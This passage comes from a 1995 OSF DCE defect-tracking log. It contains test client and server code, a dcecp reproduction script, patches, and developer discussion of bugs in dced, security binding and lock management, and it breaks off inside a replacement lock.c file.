    char *name = 0;
    handle_t h;
 
    argc--; argv++;
 
    while (argc > 0) {
        if (argv[0][0] == '-') {
            usage();
        } else {
            if (name) usage();
            name = argv[0];
        }
        argc--; argv++;
    }
    if (name == 0) usage();
 
    printf("Binding to %s\n",name);
    h = get_handle(name);
 
    doit(h);
    printf("call succeed\n");
 
    exit(0);
}
 
 
------------ server.c ----------------
/*
 * test server
 *
 * Copyright (C) 1995 Transarc Corporation - All rights reserved.
 *
 * HISTORY
 *  20-Apr-95  Daniel Nydick (nydick@transarc.com)
 *      Created.
 */
 
#define MAXCALLS 5
#define CKERR(why) if (st != error_status_ok) {\
        fprintf(stderr,"%s, err=%d\n",why,st); exit(1);}
 
#include <dce/pthread_exc.h>
#include <dce/rpc.h>
#include <bill_rqs.h>
#include <malloc.h>
#include <string.h>
#include <stdio.h>
 
extern uuid_t uuid_nil;
extern bill_rqs_v1_0_epv_t bill_rqs_v1_0_manager_epv;
 
/*
 * usage
 */
void usage(void)
{
    fprintf(stderr,"usage: server\n");
    exit(1);
}
 
/*
 * main line program
 */
main(int argc, char **argv)
{
    int i;
    error_status_t st;
    rpc_binding_vector_p_t bvec;
    unsigned_char_t *s;
 
    argc--; argv++;
    if (argc>0) usage();
 
    rpc_server_use_all_protseqs(MAXCALLS,&st);
    CKERR("rpc_server_use_all_protseqs");
 
    rpc_server_register_if(bill_rqs_v1_0_s_ifspec, &uuid_nil, NULL, &st);
    CKERR("rpc_server_register_if");
 
    rpc_server_inq_bindings(&bvec, &st);
    CKERR("rpc_server_inq_bindings");
 
    for (i=0; i<bvec->count; i++) {
        rpc_binding_to_string_binding(bvec->binding_h[i],&s,&st);
        CKERR("rpc_binding_to_string_binding");
        printf("%s\n",s);
        rpc_string_free(&s,&st);
    }
 
    TRY {
        printf("listening...\n"); fflush(stdout);
        rpc_server_listen(MAXCALLS, &st);
        CKERR("rpc_server_listen");
    } CATCH_ALL {
        fprintf(stderr,"Caught exception %x\n",THIS_CATCH);
        exit(1);
    } ENDTRY;
 
    exit(0);
}
 
/*
 * manager routines
 */
error_status_t send_strings(
    /* [in] */ handle_t h,
    /* [in] */ string_t a1[],
    /* [in] */ idl_long_int a1size,
    /* [in] */ string_t a2[],
    /* [in] */ idl_long_int a2size
){
    unsigned int i;
    printf("send_strings called. a1size=%d a2size=%d\n",a1size,a2size);
 
    printf("a1) ");
    for (i=0; i<a1size; i++) printf("\"%s\" ",a1[i]);
    printf("\n");
 
    printf("a2) ");
    for (i=0; i<a2size; i++) printf("\"%s\" ",a2[i]);
    printf("\n");
 
    return 0;
}



CR Number                     : 12854
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12696
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : epops
Short Description             : dcecp 'server disable' fails silently
Reported Date                 : 4/28/95
Found in Baseline             : 1.1
Found Date                    : 4/28/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/28/95 public]

The dcecp command 'server disable' returns {0 {}}, indicating success,
but clients can still use the disabled interface.  This can be verified
with the included script (created from the server_disable_8_P Tcl code)
properly modified for your particular environment.
	The underlying problem is that while 'server disable' successfully
updates an endpoint map structure, it is not the endpoint map structure used
by dced_ept_map().  The endpoint mapping code seems to be in a transitional
state between new and old data structures; the migration to the new structures
isn't complete (dced_ept_map() calls old_ept_map()).
	Investigating this also led me to question the validity of using
'server ping' to test whether the interface is enabled, as is done in the
server_disable_8_P test.  This is why I use tclient rather than 'server ping'
in the script provided here.  Upon further reflection, this may not be
necessary -- the rpc_mgmt_is_server_listening() must piggyback on the tserver's
interface endpoint, and if that is disabled, the ping should fail, so 'server
ping' should work just as well.

------------------------------ Begin 'disable.dcecp' -------------------------
#!/usr/bin/dcecp
set CELL_ADMIN <your cell admin principal>
set PASSWORD <password for your cell admin principal>
set HOST <your host name (no domain)>
set BINDING <protseq:addr for your host>
set DIRECTORY <the directory where you've stashed tserver and tclient>
puts stderr "Setting up..."
login $CELL_ADMIN -p $PASSWORD
catch {server delete tserver} dontcare
puts stderr [list principal create : [catch "principal create tserver" msg] $msg]
puts stderr [list group add : [catch "group add none -member tserver" msg] $msg]
puts stderr [list organization add : [catch "organization add none -member tserver" msg] $msg]
puts stderr [list account create : [catch "account create tserver -group none -org none -mypwd -dce- -password foobar" msg] $msg]
puts stderr [list keytab add : [catch "keytab add /.:/hosts/$HOST/config/keytab/self -member tserver -version 1 -key foobar" msg] $msg]
puts stderr [list server create : [catch "server create tserver -attr {{arguments /.:/hosts/$HOST/test_server} {program tserver} {entryname /.:/hosts/$HOST/test_server} {services {{annotation {dcecp server object test program}} {bindings $BINDING} {ifname {test server}} {interface 008bebed-c7c1-1ddc-9cb3-0000c0ba4944,1.0} {objects 0073f23a-2e1a-1ddd-b73a-0000c0ba4944} {entryname /.:/hosts/$HOST/test_server}}} {principals tserver} {starton explicit} {uuid 00469db2-231c-1de5-80de-0000c0ba4944} {directory $DIRECTORY}}" msg] $msg]
puts stderr [list server start : [catch "server start tserver" msg] $msg]
exec sleep 20
puts stderr "Setup complete.  Type <return> to disable interface..."
exec read ans
puts stderr "Disabling the interface..."
puts stderr [list server disable : [catch "server disable tserver -interface {008bebed-c7c1-1ddc-9cb3-0000c0ba4944,1.0}" msg] $msg]
puts stderr "Interface disabled.  Type <return> to test the client..."
exec read ans
puts stderr "Trying the client... Should yield {1 {tclient: tserver_v1_0_c_epv.server_stop failed}}..."
puts stderr [list tclient : [catch "exec $DIRECTORY/tclient /.:/hosts/$HOST/test_server 42" msg] $msg]
puts stderr "Client tested.  Type <return> to clean up..."
exec read ans
puts stderr "Cleaning up..."
catch "server stop tserver -method hard" dontcare
puts stderr [list server delete : [catch "server delete tserver" msg] $msg]
puts stderr [list keytab remove : [catch "keytab remove /.:/hosts/$HOST/config/keytab/self -member tserver" msg] $msg]
puts stderr [list account delete : [catch "account delete tserver" msg] $msg]
puts stderr [list organization remove : [catch "organization remove none -member tserver" msg] $msg]
puts stderr [list group remove : [catch "group remove none -member tserver" msg] $msg]
puts stderr [list principal delete : [catch "principal delete tserver" msg] $msg]
logout
------------------------------ End 'disable.dcecp' -------------------------



CR Number                     : 12849
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12848
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : sxops.c
Short Description             : get_random_binding() should use
					     object UUID if one is present.
Reported Date                 : 4/25/95
Found in Baseline             : 1.1
Found Date                    : 4/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : src/admin/dced/server/sxops.c
Sensitivity                   : public

[4/25/95 public]

get_random_binding() in sxops.c just picks a random binding out of the list
of bindings for a random service for the given server exec object.  If the
binding does not have an endpoint, the kill_server() function (which is the
only caller of get_random_binding()) will fail, because the RPC routine
rpc_mgmt_stop_server_listening() will not accept a binding without either
an endpoint or an object UUID (or both).  This happens EVEN IF an object UUID
was specified as part of the services attribute in the dcecp command that
created the server config object.
	The get_random_binding() routine should not ignore the object UUID
(if one is present); rather, it should set the object UUID in the binding
handle to one of the object UUIDs present for that service in the srvrexec
object.

	Here are some diffs; the line numbers are off, but are close enough...
The new variable is added at the end of the local variables for the routine
get_random_binding(), and the new code is added just after the binding has
been set in the binding handle:

536a537
>     uuid_t                    *o;
560a562,569
>
>     /* Pick a random object */
>     if (s->objects.count == 0) {
>       return;
>     }
>     i = RPC_RANDOM_GET(0, s->objects.count - 1);
>     o = &s->objects.list[i];
>     rpc_binding_set_object(*bh, o, st);

Note that this change is necessary to allow the workaround ("assigning a unique
object UUID for each server config object") mentioned in OT CR 12848.



CR Number                     : 12847
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : tcl
Short Description             : dce-lized tcl is not thread safe,
does not include pthread.h
Reported Date                 : 4/25/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 4/25/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/25/95 public]

1.1 dce-lizes tcl7.3 to make it to work in the multi-threaded environment.
Changes are put in the tcl_dce directory.

But I just found a couple of problems there:

1. DCE's pthread.h is NOT included in building tcl. Extra dce headers included
are <dce/dce.h>, <dce/dce_msg.h>, and <dce/dcetclmsg.h>. None of them really
include pthread.h.

TCL uses file operations and it actually redefines open/read/write/waitpid to
its own defintions in tclUnix.h. So simply including <pthread.h> at the 
beginning of tcl.h will not work. When I ported tcl, I changed the calls to
open/read/write/waitpid in the files which include tclUnix.h to their real
calls (TclOpen/TclRead/TclWrite/TclWaitpid) to avooid further definition
conflict.

2. Making tcl thread-safe 

There are global variables (non-static and static) in tcl.

In a multi-threaded application where only one interpreter is used, cares
must be made to use mutex to guard the global variable modification;

In a multi-threaded application where more than one interpreters are used 
(like dcecp), those global variables should be made to be per-interpreter 
based, and mutexes should be used to guard the modification to them.

3. Using it in a thread-safe way

If making 2 is not done yet, then when using tcl in a multi-threaded 
application shouldbe extremmely careful. Need to use lock for interpreter
access if more than one thread is using the same interpreter.


For dcecp, since it does not create any thread explicitly and all the use
of interpreters (3 of them) are all in the main thread, it avoids the 
problem of 2 and 3. So making 1 happen will probably solve the current dcecp
problem.

But if dcecp ever in the future to create new threads and use the interpreter(s)
in more than 2 threads, we better fix problem 2 first.

[4/25/95 public]

FYI: Watch out the deadlock (or assertion failure) bug in cma_dup2(1,1)...
(Rambling, rambling, TET API in VTS lacked pthread.h...)



CR Number                     : 12843
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : dce_config doesn't prompt for cell_admin's passwd
Reported Date                 : 4/18/95
Found in Baseline             : 1.1
Found Date                    : 2/15/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/18/95 public]

Customer reported:

     If dce_config is run when dce_logged in as cell_admin, dce_config doesn't 
     prompt for cell_admin's passwd, but it should -- it needs that password.

     Configure sec and CDS.  Get out of dce_config.  dce_login as cell_admin.
     Do the "rgy_edit cell" command as the first step in configuring cross
     cell communication.

     Start dce_config (still as cell_admin).  Choose CONFIGURE ->
     Additional Servers -> gda to start gdad (second step of configuring
     cross cell communication).

     The config_gda() function will fail, in the following rgy_edit line:

     rgy_edit -update <<EOF
     ...
     add hosts/$HOSTNAME/gda ... -pw $cellpw -mp $cellpw
     ...                             ^^^^^^^     ^^^^^^^
     EOF

     There are plenty of other failure paths also, this is just one.

Proposed Solution:

     See context diff below for the necessary changes to verify_auth():

*** dce_config	Fri Mar 31 13:25:27 1995
--- /etc/dce_config	Thu Apr 13 16:51:19 1995
***************
*** 1877,1882 ****
--- 1877,1904 ----
  		if [ $? -ne 0 ]; then
  			menu0
  		fi
+ # HaL@BUG-16681@19950413
+ #       If dce_config is run when dce_logged in as cell_admin, dce_config
+ #       doesn't prompt for cell_admin's passwd.  It leaves $cellpw == NULL,
+ #       which is cellpw's initial value.  However, $cellpw is used in 
+ #       beaucoup cases, because of the way dce_config uses the "-mp $cellpw"
+ #       "-pw $cellpw" command-line options of acl_edit and rgy_edit.
+ #       These commands will fail.
+ # Approach: Prompt for cell_admin's passwd in this case.
+ 
+         else
+ 	   # They're logged in, but we may not have the cell passwd.
+ 	   if [ "${cellpw:="NULL"}" = "NULL" ]
+ 	   then
+ 		# We don't have the password, prompt for it.
+ 		log_msg VERBOSE "User query: Enter password for the Cell Administrator: "
+ 		echon "\tEnter password for the Cell Administrator: "
+ 		stty -echo 2>/dev/null
+ 		read cellpw
+ 		stty echo 2>/dev/null
+ 		echo "\n"
+ 		log_msg VERBOSE "User entry: <not shown>"
+ 	   fi
          fi
  }



CR Number                     : 12842
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : NSI
Short Description             : sec_rgy_site_open_update() doesn't fail on invalid site name
Reported Date                 : 4/17/95
Found in Baseline             : 1.1
Found Date                    : 4/17/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[4/17/95 public]

Invalid site names of different forms are treated differently
by the sec_rgy_site_open_update() call.

If site name == "/.:foobar", then result is rpc_s_incomplete_name
If site name == ".:foobar",  then result is sec_rgy_server_unavailable
If site name == ".:/foobar,  then result is error_status_ok and context
                               is to local cell

We have an internal defect open, arguing that the third case should
fail as well.

The difference in the return codes is due to the way the input string
is treated in the internal binding code.

.:foobar -- returns sec_rgy_server_unavailable
sec_rgy_site_open_update
  sec_rgy_site_bind_update
    sec_rgy_site_bind
      rca_site_bind  /* sets context->requested_site_name = .:foobar */
        rca_nsi_binding_import /* sets cellname = requested_site_name */
          rca_site_bind_nsi  /* returns false */
            rpc_ns_entry_inq_resolution /* fails with incomplete name */
          rca_site_bind_nsi_cell /* returns false */
            rca_site_bind_nsi_cell_if /* fails with incomplete name */
          rca_site_bind_pe_site /* looks in pe_site file for entry matching
                                   .:foobar - won't find it; assumes
                                   .:foobar is a string binding */
            rca_bind_to_host /* fails right off */ 

/.:foobar -- returns rpc_s_incomplete name
sec_rgy_site_open_update
  sec_rgy_site_bind_update
    sec_rgy_site_bind
      rca_site_bind  /* sets context->requested_site_name = /.:foobar */
        rpc_ns_entry_expand_name /* this gets called because the first
                                    token is a '/'; returns 
                                    rpc_s_incomplete */

.:/foobar -- succeeds
sec_rgy_site_open_update
  sec_rgy_site_bind_update
    sec_rgy_site_bind
      rca_site_bind  /* sets context->requested_site_name = .:/foobar */
        rca_nsi_binding_import
          rca_site_bind_nsi
            rpc_ns_entry_inq_resolution /* returns rpc_s_partial_results;
                                           sets site_name
                                           in context to /.../cellname */
        .
        .       the rest of the binding routines operate on
        .       context->site_name, which is legit
        .

The only way to get the behavior to be the same in the first and third
cases is to have the security runtime to treat an rpc_s_partial_results
return from rpc_ns_entry_inq_resolution as a hard failure (in
rca_site_bind_nsi() ).  However, there  is an explicit check for the
partial_results return -- it is purposefully ignored with the
following comment:

    if (STATUS_EQUAL(status, rpc_s_partial_results))
        /* keep going in order to accept principal names; revisit someday */;

Has this logic been revisited as the comment suggests?  Is there
currently any reason NOT to fail if the input site name is of the
form .:/foobar?  Consistency has its rewards...

[4/17/95 public]
It's correct for the binding code to be doing what it's doing.
Whether it's correct for NSI to return the local cell for '.:/' is another
question, so I've reassigned this defect to RPC/NSI.

We specifically allow binding to any name within a cell, as long as that
name isn't a dead end in the CDS namespace itself.  This allows you to bind
to the rgy for any user in a cell, by their global name (ie, /.../cell/user)
by determining which partial result was found in the namespace.  That partial
result must lead to a security binding (eg, be a cellname or /.:/sec or
/.:/subsys/dce/sec/<rgyname>).  If it's a name in the namespace that doesn't
lead to a registry binding (eg, /.:/subsys/garbage resolves to /.:/subsys
which doesn't itself have a binding to a security server, and isn't a cellname
so we can't just assume that the caller wants to bind to any rgy in that cell)
then the bind will fail.

So, your real complaint shouuld be that
rpc_ns_entry_inq_resolution(".:/foobar",...) returns ok with a local cell for
the .: piece.  I think I agree with you that this is wrong.  Hopefully
nothing depends on this behavior, so that they can change it...

[2/15/96 public]
This defect hasn't had any activity in almost a year... Meanwhile
our local bug has successfully made the rounds to RPC, CDS, and
back to Security. Here are excerpts from our discussion. Any insight
is greatly appreciated.

------------------------
    <Note by ywei (Yi-Hsiu Wei), 95/04/20 12:50:33, action: note>
The reason that rpc_ns_entry_inq_resolution returns ok is 
because it gets ok from the cdsExpandStrFull from the cds 
library (search for dnsExpandStrFull in rpc/runtime/nsentry.c).

If this .:/ is an incorrect syntax, cdsExpandStrFull needs
to detect that.

    <Note by yarsa (Julianne Yarsa), 95/04/20 13:49:02, action: assign>
Bad sec_rgy_site_open_update behavior boils down to bad CDS runtime behavior.
Old Component: security.src
New Component: cds.src

    <Note by garry (Garry L. Child), 95/04/21 16:40:30, action: note>
The leading slash in a name is optional.

For example, all the following are equivalent and valid:

 cdscp show obj /.../mycell/obj1
 cdscp show obj /.:/obj1
 cdscp show obj .../mycell/obj1
 cdscp show obj .:/obj1

This behavior is consistent when you remember that a "name"
is a series of simple names separated by slashes.
When a name is parsed, the slashes serve only to separate
the simple names.

I am inclined not to change this behavior since it may
cause problems with anybody who expects this behavior
and in the future when we support XFN which allows composite
names (names which may consist of multiple forms of naming
rules and syntax strung together).

    <Note by rolette (Rolette, J.M. (Jay)), 95/04/21 18:01:38, action: note>
It's not the leading slash that is the problem (but thanks for the info...
I didn't know it wasn't required).  The problem is that I passed ".:/today"
as the site_name parameter on a sec_rgy_site_open_update() call.  There are
two kinds of valid in put for the site_name parameter (according to the docs):

1) a cell name (to randomly choose a site to bind to in the specified cell)
2) a specific registry site

If ".:/today" fits either of these types, it is number 2 (it certainly isn't
a valid cell name).  However, we didn't have a registry site called "today"
in our local cell so that should have failed as well.

I don't think that this is an NSI/RPC problem.  Julie's analysis seems to nail
the problem pretty well.  rpc_ns_entry_inq_resolution is returning 
rpc_s_partial_results (which makes sense because "today" doesn't exist).  The
problem is that the partial results return code is ignored.

Burati stated "that partial result must lead to a security binding" seems to
support my argument that you can't just ignore the partial results return code.
".:/today" would return partial results of "today" which doesn't exist so the
call should fail. As it currently works today, we end up bound to the local
cell (definitely NOT what we want to happen if the user enters a bad site name).

    <Note by garry (Garry L. Child), 95/04/25 16:17:08, action: assign>
I agree with Jay's statement, since .:/foobar is legal
syntax, the partial results return code should not be ignored.

Since foobar does not lead to a security binding (because the object
does not exist), the call should fail from security.
Old Component: cds.src
New Component: security.src

    <Note by yarsa (Julianne Yarsa), 95/04/26 15:47:44, action: note>
I wrote and ran a very small test program to find out what
rpc_ns_entry_inq_resolution() returns when given input in
the form ".:/foo".  Here are the results:

[os2dce18:/sb/defects/obj/power/security/server/bin] ./testme
calling rpc_ns_entry_inq_resolution with entry name .:/foo
rpc_ns_entry_inq_resolution returns 382312643
resolved name = /.../fink
unresolved name = foo
[os2dce18:/sb/defects/obj/power/security/server/bin] dce_err 382312643
dce_err: 382312643: partial results (dce / rpc)

The security code captures the resolved name in a variable that 
is treated as the requested site name; it is passed to 
rpc_ns_binding_import_begin() along with an interface spec to
get partial binding handles.  If rpc_ns_entry_inq_resolution()
returned junk in the resolved name portion, security would
just pass this off to the rpc_ns_binding* calls which would
fail, causing the security call to fail in turn.

So... given that the initial slash is optional, and that ".:/foo"
resolves to "/.../cellname" (resolved) and "foo" (unresolved),
and that the partially resolved name is passed to the 
rpc_ns_binding_* calls, it seems that everything is working
correctly :-).  I'd suggest waiting to see what the OSF says,
and if things remain stat, documenting the site_name parameter
of the sec_rgy_site_bind* calls more fully (which might not be
a bad idea anyway) to explain how seemingly invalid input can
lead to bindings to the local cell.

Jay, just out of curiosity, what happens when you pass in a name 
like ".:/subsys/foo"?  In such a case, Burati indicates that the 
resolved portion 1) is not a cellname and 2) doesn't lead to a 
security server, and so the call will fail.  
-----------------------
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 12840
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Restrictions on default context
Reported Date                 : 4/12/95
Found in Baseline             : 1.1
Found Date                    : 4/12/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/12/95 public]
The following sec_login routines don't allow the use of the default
login-context.  While I can see arguments why a few of these routines might
not want to support the default context, for the rest it seems an arbitary
restriction.

sec_login_refresh_identity
sec_login_newgroups
sec_login_get_pwent

sec_login_validate_identity
sec_login_certify_identity
sec_login_valid_and_cert
sec_login_valid_from_keytable
sec_login_set_context
sec_login_purge_context
sec_login_release_context
sec_login_get_groups
sec_login_krb5_add_cred
sec_login_inq_pag
sec_login_become_initiator
sec_login_become_impersonator
sec_login_set_extended_attrs
sec_login_disable_delegation
sec_login_cred_get_initiator
sec_login_cred_get_delegate
sec_login_tkt_request_options

Routines in the first group above explicitly test for and reject an
attempt to use the default handle; routines in the second group call
sec_login_pvt_check_handle which doesn't like the default context.

Also, sec_login_purge_context rejects a null _pointer_ to a login-context
with the error sec_login_s_default_use, which isn't an appropriate error.



CR Number                     : 12834
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12837
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : server/(lock.c and dce_lock.h)
Short Description             : lock management is broken.
Reported Date                 : 4/4/95
Found in Baseline             : 1.1
Found Date                    : 4/4/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : src/admin/dced/server/lock.c,
					     src/admin/dced/server/dce_lock.h
Sensitivity                   : public

[4/4/95 public]

dce_lock__write() allows the calling thread to acquire a write lock if
the following loop is exited --

    while (lock->state != lock_state_riw
        && lock->have_writer
        && pthread_equal(me, lock->riwer) != 0
        && lock->readers > 1) {
        BLOCK_OR_RETURN(lock, st);
    }

Unfortunately, this loop will exit if other threads still have read locks,
because lock->have_writer can be false (e.g., thread A acquires a read lock;
thread B acquires a RIW lock; thread B calls dce_lock__write()).  In fact,
this code would also allow a thread to acquire a write lock without having
previously called dce_lock__riw() (pthread_equal(me, lock->riwer) will be
0), etc., etc.
    The documentation in lock.h does not clearly describe the intent of the
lock manager, specifically whether a thread is obliged to call dce_lock__riw()
before calling dce_lock__write() -- but the code in lock.c defintely leans
toward this requirement.  I've got a version of lock.c that enforces this
requirement correctly -- mail me for details.
    The "write lock granted even when other threads still have read locks"
actually happened during execution of the functional/admin/dcecp TET test
suite (the "server" case); srvrexec_stop() grabs a read lock on sx_table.lock,
and then proceeds to call (via kill_server()) rpc_binding_set_auth_info(),
which ends up calling (indirectly) rpc_mgmt_inq_server_princ_name(), which
is an RPC call requiring an endpoint lookup, which is an RPC call to dced
itself, which is handled by dced_ept_map(), which calls dced_ept_lock_server(),
which grabs a write lock on sx_table.lock.  The original code grants the
write lock, setting readers=0, so when srvrexec_stop() frees the lock, the
thread encounters an assert failure which kills JUST THAT THREAD, not the
entire process, and also leaves the mutex locked on sx_table.lock, resulting
in deadlock later.

[04/05/95 public]
Yes the intent is that you get a RIW lock before you can get a write
lock.  Sounds like there are two bugs:  the ept_map should only
get a read lock (fixing that will be hard, I know); and your fix on
the locking code, which I'd be happy to review.

[04/13/95 public]

Here's a replacement dced/server/lock.c file that seems (visual inspection
only!) to be right.  Thanks, Karl!
/*
 * @OSF_COPYRIGHT@
 * COPYRIGHT NOTICE
 * Copyright (c) 1990, 1991, 1992, 1993, 1994 Open Software Foundation, Inc.
 * ALL RIGHTS RESERVED (DCE).  See the file named COPYRIGHT.DCE for
 * the full copyright text.
 * 
 */
/*
 * HISTORY
 * $Log:	c012834,v $
# Revision 1.9  96/01/24  16:08:56  root
# changed fields: Fixed In Baseline  
# 
# Revision 1.8  95/10/18  17:26:27  root
# changed fields:  new/changed/deleted note(s) [monzillo 10/17/95 ] [monzillo 10/18/95 ] [monzillo 10/17/95 ]
# 
# Revision 1.7  95/10/18  10:08:24  root
# changed fields:  new/changed/deleted note(s) [monzillo 10/18/95 ]
# 
# Revision 1.6  95/10/17  17:08:33  root
# changed fields: Inter-dependent CRs  Subcomponent Name   new/changed/deleted note(s) [monzillo 10/6/95 ] [monzillo 10/17/95 ] [monzillo 6/10/95 ]
# 
# Revision 1.5  95/10/06  16:47:14  root
# changed fields: Affected File(s)   new/changed/deleted note(s) [monzillo 6/10/95 ]
# 
# Revision 1.4  95/09/12  18:43:29  root
# changed fields: Interest List CC  
# 
# Revision 1.3  95/04/13  10:31:14  root
# changed fields:  new/changed/deleted note(s) [rsalz 04/13/95 public]
# 
 * Revision 1.1.1.5  1995/04/06  03:41:15  karlz
 * 	Removed thread ID from debug messages; serviceability inserts the thread
 * 	ID anyways.
 *
 * Revision 1.1.1.4  1995/04/04  20:12:00  karlz
 * 	Just adjusted debug levels.
 * 	Component = dhd, subcomponent = locks,
 * 		level 1	: assert failures
 * 		level 2 : lock creation/deletion
 * 		level 3 : read,riw,write,unlock
 * 
 * Revision 1.1.1.3  1995/04/04  19:20:55  karlz
 * 	Fixed lock management (see OT CR 12834).  Original code would grant a write
 * 	lock even if threads still held read locks.
 * 
 * Revision 1.1.1.2  1995/04/04  18:23:11  karlz
 * 	DCE for Digital UNIX: populate from OSF DCE R1.1
 * 
 * Revision 1.1.2.8  1994/09/26  17:49:21  rsalz
 * 	Convert to true SVC functions (OT CR 11725).
 * 	[1994/09/26  17:12:17  rsalz]
 * 
 * Revision 1.1.2.7  1994/08/03  20:36:18  rsalz
 * 	Fix OT CR 11506.
 * 	[1994/08/03  20:32:24  rsalz]
 * 
 * Revision 1.1.2.6  1994/08/02  05:45:34  rsalz
 * 	Undo in-line version of dce_lock_justwrite.
 * 	[1994/08/02  05:36:20  rsalz]
 * 
 * Revision 1.1.2.5  1994/07/05  16:03:23  rsalz
 * 	Add dce_lock_justwrite (part of OT CR 11173).
 * 	[1994/07/05  15:57:18  rsalz]
 * 
 * Revision 1.1.2.4  1994/06/09  16:03:06  devsrc
 * 	cr10892 - fix copyright
 * 	[1994/06/09  15:48:44  devsrc]
 * 
 * Revision 1.1.2.3  1994/05/10  20:15:13  rsalz
 * 	Cleanup and more functionality
 * 	[1994/05/10  20:10:43  rsalz]
 * 
 * Revision 1.1.2.2  1994/04/28  18:38:45  rsalz
 * 	Clean up some compiler warnings; remove dead code.
 * 	[1994/04/28  18:37:53  rsalz]
 * 
 * Revision 1.1.2.1  1994/04/27  19:41:35  rsalz
 * 	Add dce_assert, set up headers right
 * 	[1994/04/27  19:38:06  rsalz]
 * 
 * 	Add lock manager.
 * 	[1994/04/27  19:00:21  rsalz]
 * 
 * $EndLog$
 */

/*
** Lock manager.  Based on code by Jonathan E. Chinitz <jec@isoft.com>.
*/
#include <dcedimpl.h>


/*
**  The lock datatype.
*/
typedef struct lock_where_s_t {
    char	*file;
    int		line;
} lock_where_t;

struct dce_lock_s_t {
    pthread_mutex_t	m;
    pthread_cond_t	cv;
    int			readers;
    enum {
	lock_state_nonexistent=0, lock_state_none, lock_state_read, lock_state_riw, lock_state_write
    }			state;
    pthread_t		writer;		/* who is the writer */
    lock_where_t	the_creator;
    lock_where_t	the_writer;
};

static char	*stateNames[] = {
	"nonexistent",
	"free",
	"read",
	"riw",
	"write"
};

/*
**  Concurrency convenience macros.
*/
#define LOCK_OR_RETURN(l, st)		\
    if (pthread_mutex_lock(&l->m) < 0) { \
	*st = dced_s_mutex_lock_failed; \
	return; \
    }
#define UNLOCK_OR_RETURN(l, st)		\
    if (pthread_mutex_unlock(&l->m) < 0) { \
	*st = dced_s_mutex_unlock_failed; \
	return; \
    }
#define BLOCK_OR_RETURN(l, st)		\
    if (pthread_cond_wait(&l->cv, &l->m) < 0) { \
	 *st = dced_s_cond_wait_failed; \
	 return; \
    }
#define WAKE_ONE_OR_RETURN(l, st)	\
    if (pthread_cond_signal(&l->cv) < 0) { \
	 *st = dced_s_cond_signal_failed; \
	 return; \
    }
#define WAKE_ALL_OR_RETURN(l, st)	\
    if (pthread_cond_broadcast(&l->cv) < 0) { \
	 *st = dced_s_cond_bcast_failed; \
	 return; \
    }


/*
**  Create a lock.
*/
void
dce_lock__create(
    dce_lock_t		*lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    dce_lock_t		new;

    if ((new = (dce_lock_t)malloc(sizeof *new)) == NULL) {
	*st = dced_s_no_memory;
	return;
    }

    if (pthread_mutex_init(&new->m, pthread_mutexattr_default) < 0) {
	free(new);
	*st = dced_s_mutex_init_fail;
	return;
    }
    if (pthread_cond_init(&new->cv, pthread_condattr_default) < 0) {
	pthread_mutex_destroy(&new->m);
	free(new);
	*st = dced_s_cond_init_fail;
	return;
    }

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug2,
	"\n%s:%d\nLOCK: 0x%x (%s): create\n",
	file, line, new, stateNames[ lock_state_nonexistent ]));

    new->readers = 0;
    new->state = lock_state_none;
    new->the_creator.file = file;
    new->the_creator.line = line;
    *lock = new;

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug2,
	"\nLOCK: 0x%x (--> %s)\n",
	new, stateNames[ new->state ]));

    *st = error_status_ok;
}


/*
**  Free a lock.  Ignores failures.
*/
void
dce_lock__delete(
    dce_lock_t		lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    /* The lock must be free in order to remove it! */
    if (lock->state != lock_state_none) {
        DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
